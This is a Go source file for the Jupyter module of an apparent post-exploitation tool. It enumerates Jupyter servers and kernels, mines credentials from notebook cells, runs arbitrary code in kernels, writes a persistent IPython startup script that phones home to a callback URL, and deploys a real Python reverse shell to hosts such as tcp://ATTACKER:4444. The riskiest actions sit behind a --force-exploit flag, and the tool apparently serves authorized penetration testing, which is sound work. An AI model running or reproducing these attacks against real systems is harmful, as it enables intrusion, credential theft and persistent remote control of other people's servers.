package main

import (
	"fmt"
	"net/http/cookiejar"
	"strings"
	"sync"

	"github.com/spf13/cobra"

	"github.com/professor-moody/aipostex/internal/runtimehttp"
	exploitcommon "github.com/professor-moody/aipostex/pkg/exploit/common"
	"github.com/professor-moody/aipostex/pkg/exploit/jupyter"
	"github.com/professor-moody/aipostex/pkg/payloads"
	"github.com/professor-moody/aipostex/pkg/report"
)

var (
	jupyterTarget      string
	jupyterToken       string
	jupyterHeaders     []string
	jupyterPath        string
	jupyterKernel      string
	jupyterCode        string
	jupyterMineSecrets bool
)

var jupyterCmd = &cobra.Command{
	Use:   "jupyter",
	Short: "Enumerate and exploit Jupyter servers",
	Long: `Enumerate notebooks, kernels, and metadata from Jupyter servers, or execute code in an existing kernel.

Mutating or execution-oriented actions require --force-exploit.`,
	Example: strings.Join([]string{
		formatCommandExample("jupyter --target http://127.0.0.1:8888 --token demo enum"),
		formatCommandExample("jupyter --target http://127.0.0.1:8888 --token demo exec --kernel kernel-1 --code \"print('hi')\" --force-exploit"),
	}, "\n"),
}

var jupyterEnumCmd = &cobra.Command{Use: "enum", Short: "Enumerate Jupyter server metadata", Long: "Enumerate Jupyter server metadata and status.\n\nEstablishes whether the server answers without a token — the control that matters,\nsince an unauthenticated Jupyter server is arbitrary code execution as the notebook\nuser. Also records version and configuration detail for the kernel and notebook\nsurfaces that follow.\n\nThis is a read-only probing operation.", Example: formatCommandExample("jupyter --target http://127.0.0.1:8888 enum"), RunE: runJupyterEnum}
var jupyterKernelsCmd = &cobra.Command{Use: "kernels", Short: "List active kernels", Long: "List the kernels currently running on the server.\n\nA live kernel is an execution context that already exists: it can be attached to\nand used to run code without starting anything new. The list also shows which\nlanguages and environments are available.\n\nThis is a read-only probing operation.", Example: formatCommandExample("jupyter --target http://127.0.0.1:8888 kernels"), RunE: runJupyterKernels}
var jupyterNotebooksCmd = &cobra.Command{Use: "notebooks", Short: "List notebook files", Long: "List notebook files visible to the server.\n\nNotebooks are where data-science credentials live in practice — API keys, tokens,\nand connection strings pasted into cells for convenience. This lists the files;\nadd --mine-secrets to fetch each notebook and scan its cells for credentials,\nwhich surface into the credential index.\n\nThis is a read-only probing operation.", Example: formatCommandExample("jupyter --target http://127.0.0.1:8888 notebooks"), RunE: runJupyterNotebooks}
var jupyterReadCmd = &cobra.Command{Use: "read-notebook", Short: "Read a notebook by path", Long: "Read a single notebook file by path.\n\nReturns the notebook's cells — source, outputs, and any secrets embedded in\neither. Cell outputs matter as much as source: a printed dataframe or an echoed\nenvironment variable persists in the file long after the code ran.\n\nThis is a read-only probing operation.", Example: formatCommandExample("jupyter --target http://127.0.0.1:8888 read-notebook --path demo.ipynb"), RunE: runJupyterReadNotebook}
var jupyterExecCmd = &cobra.Command{Use: "exec",
	Annotations: map[string]string{"aipostex.gated": "true"}, Short: "Execute code in an existing kernel", Long: "Execute code in an existing kernel.\n\nThis is an active exploit action and requires --force-exploit.", Example: formatCommandExample("jupyter --target http://127.0.0.1:8888 exec --kernel kernel-1 --code \"print('hi')\" --force-exploit"), RunE: runJupyterExec}
var jupyterStartKernelCmd = &cobra.Command{Use: "start-kernel",
	Annotations: map[string]string{"aipostex.gated": "true"}, Short: "Start a new kernel", Long: "Start a new kernel on the Jupyter server.\n\nThis is an active exploit action and requires --force-exploit.", Example: formatCommandExample("jupyter --target http://127.0.0.1:8888 start-kernel --force-exploit"), RunE: runJupyterStartKernel}
var jupyterRevshellProofCmd = &cobra.Command{Use: "reverse-shell-proof",
	Annotations: map[string]string{"aipostex.gated": "true"}, Short: "Prove outbound socket capability via kernel", Long: "Execute a safe payload that proves the Jupyter kernel can open outbound sockets.\nUses a non-routable address (TEST-NET) to avoid actual reverse shell.\n\nRequires --force-exploit.", Example: formatCommandExample("jupyter --target http://127.0.0.1:8888 reverse-shell-proof --kernel kernel-1 --force-exploit"), RunE: runJupyterRevshellProof}
var jupyterPipProofCmd = &cobra.Command{Use: "pip-proof",
	Annotations: map[string]string{"aipostex.gated": "true"}, Short: "Prove pip install capability via kernel", Long: "Execute a pip dry-run install to prove the kernel can install packages.\nNo packages are actually installed.\n\nRequires --force-exploit.", Example: formatCommandExample("jupyter --target http://127.0.0.1:8888 pip-proof --kernel kernel-1 --force-exploit"), RunE: runJupyterPipProof}

var jupyterPersistCmd = &cobra.Command{
	Use:         "persist",
	Annotations: map[string]string{"aipostex.gated": "true"},
	Short:       "Install persistent access via a Jupyter startup script",
	Long: `Deploys a Jupyter IPython startup script that phones home to --callback-url
on every kernel restart. This is a destructive post-exploitation action.

Requires --force-exploit.`,
	Example: formatCommandExample("jupyter --target http://127.0.0.1:8888 persist --kernel kernel-1 --callback-url http://ATTACKER:8443/webhook --force-exploit"),
	RunE:    runJupyterPersist,
}

var jupyterRevshellCmd = &cobra.Command{
	Use:         "revshell",
	Annotations: map[string]string{"aipostex.gated": "true"},
	Short:       "Deploy a real reverse shell via kernel (requires --force-exploit)",
	Long: `Execute a Python reverse shell payload in the kernel. Requires a TCP listener
running at --callback-url tcp://HOST:PORT.

Requires --force-exploit.`,
	Example: formatCommandExample("jupyter --target http://127.0.0.1:8888 revshell --kernel kernel-1 --callback-url tcp://ATTACKER:4444 --force-exploit"),
	RunE:    runJupyterRevshell,
}

func init() {
	jupyterCmd.PersistentFlags().StringVarP(&jupyterTarget, "target", "t", "", "Jupyter server URL (required)")
	jupyterCmd.PersistentFlags().StringVar(&jupyterToken, "token", "", "Jupyter authentication token")
	jupyterCmd.PersistentFlags().StringSliceVar(&jupyterHeaders, "header", nil, "Additional HTTP header(s) in 'Key: Value' format")

	jupyterReadCmd.Flags().StringVar(&jupyterPath, "path", "", "Notebook path to read")

	jupyterExecCmd.Flags().StringVar(&jupyterKernel, "kernel", "", "Existing kernel ID")
	jupyterExecCmd.Flags().StringVar(&jupyterCode, "code", "", "Code to execute")

	jupyterRevshellProofCmd.Flags().StringVar(&jupyterKernel, "kernel", "", "Kernel ID for reverse shell proof")
	jupyterPipProofCmd.Flags().StringVar(&jupyterKernel, "kernel", "", "Kernel ID for pip install proof")

	jupyterPersistCmd.Flags().StringVar(&jupyterKernel, "kernel", "", "Kernel ID for persistence deployment")
	jupyterRevshellCmd.Flags().StringVar(&jupyterKernel, "kernel", "", "Kernel ID for reverse shell")

	jupyterNotebooksCmd.Flags().BoolVar(&jupyterMineSecrets, "mine-secrets", false, "Fetch each listed notebook and scan cells for embedded credentials (extra API traffic)")

	jupyterCmd.AddCommand(jupyterEnumCmd, jupyterKernelsCmd, jupyterNotebooksCmd, jupyterReadCmd, jupyterExecCmd, jupyterStartKernelCmd, jupyterRevshellProofCmd, jupyterPipProofCmd, jupyterPersistCmd, jupyterRevshellCmd)
}

func runJupyterEnum(cmd *cobra.Command, args []string) error {
	client, err := newJupyterClient()
	if err != nil {
		return err
	}
	status, err := client.ServerStatus()
	if err != nil {
		return fmt.Errorf("enumerating jupyter server: %w", err)
	}
	kernels, kernelErr := client.ListKernels()
	notebooks, notebookErr := client.ListNotebooks()

	findings := []report.Finding{
		newExploitFinding(
			report.SourceJupyter,
			jupyterTarget,
			"Jupyter server enumerated",
			report.SeverityInfo,
			fmt.Sprintf("Enumerated Jupyter server with %d kernel(s) and %d notebook item(s)", len(kernels), len(notebooks)),
			map[string]interface{}{
				"module":       "jupyter",
				"action":       "enum",
				"mutating":     false,
				"provider":     "jupyter",
				"kernel_count": len(kernels),
				"started":      status.Started,
			},
		),
	}
	findings[0].Metadata = applyStageLanded(findings[0].Metadata, "recon", "reachable", "jupyter-enum", "server")
	notebookPaths := make([]string, 0, len(notebooks))
	for _, notebook := range notebooks {
		if strings.EqualFold(notebook.Type, "notebook") {
			notebookPaths = append(notebookPaths, notebook.Path)
		}
	}
	kernelIDs := make([]string, 0, len(kernels))
	for _, kernel := range kernels {
		kernelIDs = append(kernelIDs, kernel.ID)
	}
	summaryPlan := buildJupyterEnumWorkflowPlan(jupyterTarget, notebookPaths, kernelIDs)
	findings[0].Metadata = attachWorkflowToMetadata(findings[0].Metadata, summaryPlan)
	if kernelErr != nil {
		warnf("listing kernels: %v", kernelErr)
	}
	if notebookErr != nil {
		warnf("listing notebooks: %v", notebookErr)
	}
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "jupyter",
		Action:              "enum",
		ResourcesEnumerated: len(kernels) + len(notebooks),
		PartialFailures:     countNonNilErrors(kernelErr, notebookErr),
		Mutating:            false,
		WorkflowFailures:    countNonNilErrors(kernelErr, notebookErr),
		WorkflowPlans:       []workflowPlan{summaryPlan},
	})
}

func runJupyterKernels(cmd *cobra.Command, args []string) error {
	client, err := newJupyterClient()
	if err != nil {
		return err
	}
	kernels, err := client.ListKernels()
	if err != nil {
		return err
	}
	findings := make([]report.Finding, 0, len(kernels))
	for _, kernel := range kernels {
		finding := newExploitFinding(
			report.SourceJupyter,
			jupyterTarget,
			fmt.Sprintf("Jupyter kernel discovered: %s", kernel.ID),
			report.SeverityInfo,
			fmt.Sprintf("Kernel %s is available for notebook execution", kernel.ID),
			map[string]interface{}{
				"module":   "jupyter",
				"action":   "kernels",
				"mutating": false,
				"provider": "jupyter",
				"kernel":   kernel.ID,
				"name":     kernel.Name,
			},
		)
		finding.Metadata = applyStageLanded(finding.Metadata, "recon", "reachable", "jupyter-kernels", "kernel")
		finding.Metadata = attachWorkflowToMetadata(finding.Metadata, buildJupyterKernelWorkflowPlan(jupyterTarget, kernel.ID))
		findings = append(findings, finding)
	}
	summaryPlan := suppressWorkflowCommands(
		buildJupyterEnumWorkflowPlan(jupyterTarget, nil, kernelIDsFromKernels(kernels)),
		formatCommandExample("jupyter --target "+jupyterTarget+" kernels"),
	)
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "jupyter",
		Action:              "kernels",
		ResourcesEnumerated: len(kernels),
		PartialFailures:     0,
		Mutating:            false,
		WorkflowPlans:       []workflowPlan{summaryPlan},
	})
}

func runJupyterNotebooks(cmd *cobra.Command, args []string) error {
	client, err := newJupyterClient()
	if err != nil {
		return err
	}
	notebooks, err := client.ListNotebooks()
	if err != nil {
		return err
	}
	findings := make([]report.Finding, 0, len(notebooks))
	for _, notebook := range notebooks {
		finding := newExploitFinding(
			report.SourceJupyter,
			jupyterTarget,
			fmt.Sprintf("Jupyter notebook entry discovered: %s", notebook.Path),
			report.SeverityInfo,
			fmt.Sprintf("%s item %s is readable", notebook.Type, notebook.Path),
			map[string]interface{}{
				"module":   "jupyter",
				"action":   "notebooks",
				"mutating": false,
				"provider": "jupyter",
				"path":     notebook.Path,
				"type":     notebook.Type,
			},
		)
		finding.Metadata = applyStageLanded(finding.Metadata, "recon", "reachable", "jupyter-notebooks", "notebook")
		if strings.EqualFold(notebook.Type, "notebook") {
			finding.Metadata = attachWorkflowToMetadata(finding.Metadata, buildJupyterNotebookWorkflowPlan(jupyterTarget, notebook.Path))
		}
		findings = append(findings, finding)
	}
	partialFailures := 0
	secretCount := 0
	credentialPlans := make([]workflowPlan, 0)
	if jupyterMineSecrets {
		notebookPaths, derr := client.DiscoverNotebookPaths()
		if derr != nil {
			return fmt.Errorf("discovering notebook paths for secret mining: %w", derr)
		}
		workers := cfg.Concurrency
		if workers < 1 {
			workers = 1
		}
		if workers > 8 {
			workers = 8
		}
		if len(notebookPaths) > 0 {
			jobs := make(chan string)
			type mineOut struct {
				path    string
				secrets []jupyter.SecretMatch
				err     error
			}
			outCh := make(chan mineOut, len(notebookPaths))
			var wg sync.WaitGroup
			for w := 0; w < workers; w++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					for p := range jobs {
						content, rerr := client.ReadNotebook(p)
						if rerr != nil {
							outCh <- mineOut{path: p, err: rerr}
							continue
						}
						outCh <- mineOut{path: p, secrets: jupyter.MineNotebookSecrets(content.Content)}
					}
				}()
			}
			for _, p := range notebookPaths {
				jobs <- p
			}
			close(jobs)
			wg.Wait()
			close(outCh)
			for mo := range outCh {
				if mo.err != nil {
					partialFailures++
					warnf("read notebook %s: %v", mo.path, mo.err)
					continue
				}
				for _, secret := range mo.secrets {
					secretCount++
					sf := newExploitFinding(
						report.SourceJupyter,
						jupyterTarget,
						fmt.Sprintf("Credential in notebook %s: %s", mo.path, secret.Pattern),
						report.SeverityHigh,
						fmt.Sprintf("%s found in cell %d of notebook %s", secret.Pattern, secret.Cell, mo.path),
						map[string]interface{}{
							"module":       "jupyter",
							"action":       "notebooks",
							"mutating":     false,
							"provider":     "jupyter",
							"path":         mo.path,
							"secret_type":  secret.Pattern,
							"cell_index":   secret.Cell,
							"stage":        "impact",
							"landed":       "read-confirmed",
							"mine_secrets": true,
						},
					)
					sf.Evidence = secret.Value
					sf.Metadata["extracted_credentials"] = lootCredentialRecord("jupyter-notebook-secret", secret.Pattern, secret.Value, jupyterTarget, fmt.Sprintf("cell %d of notebook %s", secret.Cell, mo.path))
					if plan := buildJupyterCredentialWorkflowPlan(jupyterTarget, mo.path, secret.Pattern, secret.Value); len(plan.Recommendations) > 0 {
						sf.Metadata = attachWorkflowToMetadata(sf.Metadata, plan)
						credentialPlans = append(credentialPlans, plan)
					}
					findings = append(findings, sf)
				}
				if len(mo.secrets) > 0 {
					infof("Mined %d secret(s) from notebook %s", len(mo.secrets), mo.path)
				}
			}
		}
	}
	allPaths := allPathsFromEntries(notebooks)
	summaryPlan := buildJupyterNotebooksSummaryWorkflowPlan(jupyterTarget, allPaths, nil)
	workflowPlans := append([]workflowPlan{summaryPlan}, credentialPlans...)
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "jupyter",
		Action:              "notebooks",
		ResourcesEnumerated: len(notebooks) + secretCount,
		PartialFailures:     partialFailures,
		Mutating:            false,
		WorkflowPlans:       workflowPlans,
	})
}

func runJupyterReadNotebook(cmd *cobra.Command, args []string) error {
	if strings.TrimSpace(jupyterPath) == "" {
		return missingFlagError("path", formatCommandExample("jupyter --target http://127.0.0.1:8888 read-notebook --path demo.ipynb"))
	}
	client, err := newJupyterClient()
	if err != nil {
		return err
	}
	notebook, err := client.ReadNotebook(jupyterPath)
	if err != nil {
		return err
	}
	finding := newExploitFinding(
		report.SourceJupyter,
		jupyterTarget,
		fmt.Sprintf("Jupyter notebook read: %s", notebook.Path),
		report.SeverityHigh,
		fmt.Sprintf("Notebook %s was readable through the Jupyter contents API", notebook.Path),
		map[string]interface{}{
			"module":   "jupyter",
			"action":   "read-notebook",
			"mutating": false,
			"provider": "jupyter",
			"path":     notebook.Path,
		},
	)
	finding.Metadata = applyStageLanded(finding.Metadata, "impact", "read-confirmed", "jupyter-read-notebook", "notebook")
	finding.Evidence = string(notebook.Content)

	findings := []report.Finding{finding}
	secrets := jupyter.MineNotebookSecrets(notebook.Content)
	credentialPlans := make([]workflowPlan, 0, len(secrets))
	for _, secret := range secrets {
		sf := newExploitFinding(
			report.SourceJupyter,
			jupyterTarget,
			fmt.Sprintf("Credential in notebook %s: %s", notebook.Path, secret.Pattern),
			report.SeverityHigh,
			fmt.Sprintf("%s found in cell %d of notebook %s", secret.Pattern, secret.Cell, notebook.Path),
			map[string]interface{}{
				"module":      "jupyter",
				"action":      "read-notebook",
				"mutating":    false,
				"provider":    "jupyter",
				"path":        notebook.Path,
				"secret_type": secret.Pattern,
				"cell_index":  secret.Cell,
				"stage":       "impact",
				"landed":      "read-confirmed",
			},
		)
		sf.Evidence = secret.Value
		sf.Metadata["extracted_credentials"] = lootCredentialRecord("jupyter-notebook-secret", secret.Pattern, secret.Value, jupyterTarget, fmt.Sprintf("cell %d of notebook %s", secret.Cell, notebook.Path))
		if credPlan := buildJupyterCredentialWorkflowPlan(jupyterTarget, notebook.Path, secret.Pattern, secret.Value); len(credPlan.Recommendations) > 0 {
			sf.Metadata = attachWorkflowToMetadata(sf.Metadata, credPlan)
			credentialPlans = append(credentialPlans, credPlan)
		}
		findings = append(findings, sf)
	}
	if len(secrets) > 0 {
		infof("Mined %d secret(s) from notebook %s", len(secrets), notebook.Path)
	}

	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module: "jupyter",
		Action: "read-notebook",
		// One resource enumerated: the notebook read. Mined secrets are findings, not
		// resources — counting them here inflated "resource(s)" (was 1 + len(secrets)).
		ResourcesEnumerated: 1,
		PartialFailures:     0,
		Mutating:            false,
		WorkflowPlans:       credentialPlans,
	})
}

func runJupyterExec(cmd *cobra.Command, args []string) error {
	if strings.TrimSpace(jupyterKernel) == "" {
		return missingFlagError("kernel", formatCommandExample("jupyter --target http://127.0.0.1:8888 exec --kernel kernel-1 --code \"print('hi')\" --force-exploit"))
	}
	if strings.TrimSpace(jupyterCode) == "" {
		return missingFlagError("code", formatCommandExample("jupyter --target http://127.0.0.1:8888 exec --kernel kernel-1 --code \"print('hi')\" --force-exploit"))
	}
	if err := requireForceExploit("jupyter exec"); err != nil {
		return err
	}
	client, err := newJupyterClient()
	if err != nil {
		return err
	}
	output, err := client.Execute(jupyterKernel, jupyterCode)
	if err != nil {
		return err
	}
	finding := newExploitFinding(
		report.SourceJupyter,
		jupyterTarget,
		fmt.Sprintf("Jupyter code executed via kernel %s", jupyterKernel),
		report.SeverityHigh,
		fmt.Sprintf("Executed code through existing kernel %s", jupyterKernel),
		map[string]interface{}{
			"module":   "jupyter",
			"action":   "exec",
			"mutating": true,
			"provider": "jupyter",
			"kernel":   jupyterKernel,
		},
	)
	finding.Metadata = applyStageLanded(finding.Metadata, "impact", "execution-confirmed", "jupyter-exec", "code-execution")
	finding.Evidence = output
	execPlan := buildJupyterExecWorkflowPlan(jupyterTarget, jupyterKernel)
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, execPlan)
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "jupyter",
		Action:              "exec",
		ResourcesEnumerated: 1,
		PartialFailures:     0,
		Mutating:            true,
		WorkflowPlans:       []workflowPlan{execPlan},
	})
}

func runJupyterStartKernel(cmd *cobra.Command, args []string) error {
	if err := requireForceExploit("jupyter start-kernel"); err != nil {
		return err
	}
	client, err := newJupyterClient()
	if err != nil {
		return err
	}
	kernel, err := client.StartKernel("python3")
	if err != nil {
		return fmt.Errorf("starting kernel: %w", err)
	}
	finding := newExploitFinding(
		report.SourceJupyter,
		jupyterTarget,
		fmt.Sprintf("Jupyter kernel started: %s", kernel.ID),
		report.SeverityCritical,
		fmt.Sprintf("Started a new kernel %s (%s) on the Jupyter server without authentication", kernel.ID, kernel.Name),
		map[string]interface{}{
			"module":    "jupyter",
			"action":    "start-kernel",
			"mutating":  true,
			"provider":  "jupyter",
			"kernel":    kernel.ID,
			"kernel_id": kernel.ID,
			"name":      kernel.Name,
		},
	)
	finding.Evidence = fmt.Sprintf("kernel_id=%s\nname=%s", kernel.ID, kernel.Name)
	// Starting a kernel is an unauth foothold/state-change, not code execution — no code
	// has run yet. `jupyter exec --kernel <id>` is the execution-confirmed proof.
	finding.Metadata = applyStageLanded(finding.Metadata, "access", "influenced", "jupyter-start-kernel", "kernel")
	plan := buildJupyterKernelWorkflowPlan(jupyterTarget, kernel.ID)
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, plan)
	infof("Started kernel %s on %s", kernel.ID, jupyterTarget)
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "jupyter",
		Action:              "start-kernel",
		ResourcesEnumerated: 1,
		Mutating:            true,
		WorkflowPlans:       []workflowPlan{plan},
	})
}

func runJupyterRevshellProof(cmd *cobra.Command, args []string) error {
	if strings.TrimSpace(jupyterKernel) == "" {
		return missingFlagError("kernel", formatCommandExample("jupyter --target http://127.0.0.1:8888 reverse-shell-proof --kernel kernel-1 --force-exploit"))
	}
	if err := requireForceExploit("jupyter reverse-shell-proof"); err != nil {
		return err
	}
	if _, _, ok := parseTCPCallbackURL(cfg.CallbackURL); ok {
		warnf("--callback-url is ignored by reverse-shell-proof; use 'jupyter revshell' with --force-exploit for a real reverse shell")
	}

	client, err := newJupyterClient()
	if err != nil {
		return err
	}

	// Always run the safe proof with non-routable TEST-NET address.
	output, err := client.ReverseShellProof(jupyterKernel)
	if err != nil {
		return fmt.Errorf("reverse shell proof: %w", err)
	}
	finding := newExploitFinding(
		report.SourceJupyter,
		jupyterTarget,
		"Jupyter reverse shell capability confirmed",
		report.SeverityCritical,
		fmt.Sprintf("Kernel %s can create outbound sockets, confirming reverse shell capability", jupyterKernel),
		map[string]interface{}{
			"module":   "jupyter",
			"action":   "reverse-shell-proof",
			"mutating": true,
			"provider": "jupyter",
			"kernel":   jupyterKernel,
		},
	)
	finding.Metadata = applyStageLanded(finding.Metadata, "impact", "execution-confirmed", "jupyter-reverse-shell-proof", "reverse-shell")
	finding.Metadata["kernel_id"] = jupyterKernel
	finding.Evidence = output
	plan := workflowPlan{
		Target:      canonicalServiceURL(jupyterTarget),
		Stage:       "proof",
		Landed:      "execution-confirmed",
		ChainSource: "jupyter-reverse-shell-proof",
		Rationale:   "Reverse shell capability confirmed; kernel can create outbound sockets.",
		Recommendations: []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample("jupyter --target "+canonicalServiceURL(jupyterTarget)+" pip-proof --kernel "+jupyterKernel+" --force-exploit"), "Confirm pip install capability for supply-chain attack surface.", true, 10),
		},
	}
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, plan)
	infof("Reverse shell proof executed on kernel %s", jupyterKernel)
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "jupyter",
		Action:              "reverse-shell-proof",
		ResourcesEnumerated: 1,
		Mutating:            true,
		WorkflowPlans:       []workflowPlan{plan},
	})
}

func runJupyterPipProof(cmd *cobra.Command, args []string) error {
	if strings.TrimSpace(jupyterKernel) == "" {
		return missingFlagError("kernel", formatCommandExample("jupyter --target http://127.0.0.1:8888 pip-proof --kernel kernel-1 --force-exploit"))
	}
	if err := requireForceExploit("jupyter pip-proof"); err != nil {
		return err
	}
	client, err := newJupyterClient()
	if err != nil {
		return err
	}
	output, err := client.InstallExtensionProof(jupyterKernel, "requests")
	if err != nil {
		return fmt.Errorf("pip install proof: %w", err)
	}

	// Honesty: the kernel runs our pip subprocess, but if pip itself rejects the
	// install (externally-managed-environment / non-zero return) we have NOT proven
	// pip-install capability — only that the kernel executed code. Downgrade the
	// claim to match the observed evidence.
	lowerOut := strings.ToLower(output)
	pipInstallable := strings.Contains(output, "returncode: 0") &&
		!strings.Contains(lowerOut, "externally-managed") &&
		!strings.Contains(lowerOut, "error:")

	title := "Jupyter pip install capability confirmed"
	severity := report.SeverityHigh
	stage := "proof"
	landed := "execution-confirmed"
	description := fmt.Sprintf("Kernel %s can execute pip install, confirming package installation capability", jupyterKernel)
	rationale := "Pip install capability confirmed; packages can be injected into the kernel runtime."
	if !pipInstallable {
		title = "Jupyter kernel executes code; pip install blocked (externally-managed)"
		severity = report.SeverityMedium
		stage = "probe"
		landed = "influenced"
		description = fmt.Sprintf("Kernel %s executed the pip subprocess, but pip did not install the package (e.g. externally-managed-environment). Code execution via the kernel is possible; package installation via pip is not confirmed.", jupyterKernel)
		rationale = "Kernel executes arbitrary code (use exec to demonstrate); pip install itself is blocked."
	}

	finding := newExploitFinding(
		report.SourceJupyter,
		jupyterTarget,
		title,
		severity,
		description,
		map[string]interface{}{
			"module":   "jupyter",
			"action":   "pip-proof",
			"mutating": true,
			"provider": "jupyter",
			"kernel":   jupyterKernel,
		},
	)
	finding.Metadata = applyStageLanded(finding.Metadata, stage, landed, "jupyter-pip-proof", "pip-install")
	finding.Evidence = output
	plan := workflowPlan{
		Target:      canonicalServiceURL(jupyterTarget),
		Stage:       stage,
		Landed:      landed,
		ChainSource: "jupyter-pip-proof",
		Rationale:   rationale,
		Recommendations: []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample("jupyter --target "+canonicalServiceURL(jupyterTarget)+" exec --kernel "+jupyterKernel+" --code \"import os; os.popen('id').read()\" --force-exploit"), "Demonstrate arbitrary code execution via the kernel.", true, 10),
		},
	}
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, plan)
	infof("Pip proof executed on kernel %s", jupyterKernel)
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "jupyter",
		Action:              "pip-proof",
		ResourcesEnumerated: 1,
		Mutating:            true,
		WorkflowPlans:       []workflowPlan{plan},
	})
}

func newJupyterClient() (*jupyter.Client, error) {
	if strings.TrimSpace(jupyterTarget) == "" {
		return nil, missingFlagError("target", formatCommandExample("jupyter --target http://127.0.0.1:8888 enum"))
	}
	headers, err := exploitcommon.ParseHeaderFlags(jupyterHeaders)
	if err != nil {
		return nil, err
	}
	target := normalizeAndWarnTarget(jupyterTarget)
	jupyterTarget = target
	client, err := jupyter.NewClient(currentContext(), target, jupyterToken, cfg.Timeout, headers)
	if err != nil {
		return nil, err
	}
	httpClient, err := cfg.NewHTTPClient()
	if err != nil {
		return nil, err
	}
	jar, _ := cookiejar.New(nil)
	httpClient.Jar = jar
	client.HTTPClient = httpClient
	client.ForceExploit = cfg.ForceExploit
	wsDialer, err := runtimehttp.NewWebsocketDialer(cfg.HTTPOptions())
	if err != nil {
		return nil, err
	}
	client.SetWebsocketDialer(wsDialer)
	return client, nil
}

func countNonNilErrors(errs ...error) int {
	count := 0
	for _, err := range errs {
		if err != nil {
			count++
		}
	}
	return count
}

func kernelIDsFromKernels(kernels []jupyter.Kernel) []string {
	ids := make([]string, 0, len(kernels))
	for _, kernel := range kernels {
		ids = append(ids, kernel.ID)
	}
	return ids
}

func allPathsFromEntries(entries []jupyter.ContentsResponse) []string {
	paths := make([]string, 0, len(entries))
	for _, entry := range entries {
		paths = append(paths, entry.Path)
	}
	return paths
}

func runJupyterPersist(cmd *cobra.Command, args []string) error {
	if err := requireForceExploit("jupyter persist"); err != nil {
		return err
	}
	if strings.TrimSpace(jupyterKernel) == "" {
		return missingFlagError("kernel", formatCommandExample("jupyter --target http://127.0.0.1:8888 persist --kernel kernel-1 --callback-url http://ATTACKER:8443/webhook --force-exploit"))
	}
	if strings.TrimSpace(cfg.CallbackURL) == "" {
		return missingFlagError("callback-url", formatCommandExample("jupyter --target http://127.0.0.1:8888 persist --kernel kernel-1 --callback-url http://ATTACKER:8443/webhook --force-exploit"))
	}
	client, err := newJupyterClient()
	if err != nil {
		return err
	}

	payload, err := payloads.Generate("python-persist-jupyter-ext", payloads.Params{
		CallbackURL: cfg.CallbackURL,
	})
	if err != nil {
		return fmt.Errorf("generating persistence payload: %w", err)
	}

	output, err := client.Execute(jupyterKernel, payload)
	if err != nil {
		return fmt.Errorf("deploying persistence: %w", err)
	}

	finding := newExploitFinding(
		report.SourceJupyter,
		jupyterTarget,
		fmt.Sprintf("Jupyter persistence script written (pending restart): %s", jupyterKernel),
		report.SeverityHigh,
		fmt.Sprintf("Wrote an IPython startup script on kernel %s that will phone home to %s on the next restart; the restart/callback was NOT observed, so persistence is accepted-not-confirmed.",
			jupyterKernel, cfg.CallbackURL),
		map[string]interface{}{
			"module":       "jupyter",
			"action":       "persist",
			"mutating":     true,
			"provider":     "jupyter",
			"kernel_id":    jupyterKernel,
			"callback_url": cfg.CallbackURL,
		},
	)
	finding.Evidence = output
	// The startup script is a WRITE that only runs on the NEXT kernel restart — not observed here.
	// So this is an accepted mutation (influenced), not confirmed own; no callback is watched. Also
	// "persistence-deployed" was never a valid landed value.
	finding.Metadata = applyStageLanded(finding.Metadata, "impact", "influenced", "jupyter-persist", "startup-script")

	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "jupyter",
		Action:              "persist",
		ResourcesEnumerated: 1,
		Mutating:            true,
	})
}

func runJupyterRevshell(cmd *cobra.Command, args []string) error {
	if err := requireForceExploit("jupyter revshell"); err != nil {
		return err
	}
	if strings.TrimSpace(jupyterKernel) == "" {
		return missingFlagError("kernel", formatCommandExample("jupyter --target http://127.0.0.1:8888 revshell --kernel kernel-1 --callback-url tcp://ATTACKER:4444 --force-exploit"))
	}
	host, port, ok := parseTCPCallbackURL(cfg.CallbackURL)
	if !ok {
		return fmt.Errorf("--callback-url must be tcp://HOST:PORT for reverse shell (got %q)", cfg.CallbackURL)
	}
	client, err := newJupyterClient()
	if err != nil {
		return err
	}

	payload, err := payloads.Generate("python-revshell", payloads.Params{
		CallbackHost: host,
		CallbackPort: port,
	})
	if err != nil {
		return fmt.Errorf("generating reverse shell payload: %w", err)
	}

	output, err := client.Execute(jupyterKernel, payload)
	if err != nil {
		return fmt.Errorf("deploying reverse shell: %w", err)
	}

	finding := newExploitFinding(
		report.SourceJupyter,
		jupyterTarget,
		fmt.Sprintf("Jupyter reverse shell deployed: %s", jupyterKernel),
		report.SeverityCritical,
		fmt.Sprintf("Reverse shell payload deployed via kernel %s → %s:%d",
			jupyterKernel, host, port),
		map[string]interface{}{
			"module":       "jupyter",
			"action":       "revshell",
			"mutating":     true,
			"provider":     "jupyter",
			"kernel_id":    jupyterKernel,
			"callback_url": cfg.CallbackURL,
		},
	)
	finding.Evidence = output
	finding.Metadata = applyStageLanded(finding.Metadata, "own", "shell-deployed", "jupyter-revshell", "reverse-shell")

	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "jupyter",
		Action:              "revshell",
		ResourcesEnumerated: 1,
		Mutating:            true,
	})
}
